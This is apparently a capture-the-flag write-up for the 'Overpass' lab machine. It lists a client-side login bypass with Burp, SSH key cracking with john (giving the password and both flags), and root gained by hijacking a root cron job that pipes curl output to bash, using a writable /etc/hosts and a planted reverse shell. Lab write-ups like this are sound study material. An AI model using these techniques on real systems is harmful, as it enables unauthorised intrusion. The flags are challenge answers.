```
Overpass - 10.10.60.76
```

# Ports Open - 22,80

# Details of Ports:
22		ssh
80		http

# Findings + Exloitation:
> found "/admin" in the website
> found a "login.js" file
> found that it is vuln
> it checks for "Incorrect Credentials" display
> used burp to edit the response and cleared the "Incorrect Credentials"
> got in
> got a id rsa key but encrypted
> used ssh2john to get hash
> cracked it using john
> password was "james13"
> logged in using the id rsa and the password
> got in
> user.txt:
	thm{65c1aaf000506e56996822c6281e6bf7}
> ran linpeas and found /etc/hosts writeable
> also found a cronjob running:
	* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
> so edited the /etc/hosts file with our ip address and domain as "overpass.thm" also made the directories on our webserver
> set up a rev shell on "buildscript.sh" and a listener
> after a min got root!
	thm{7f336f8c359dbac18d54fdd64ea753bb}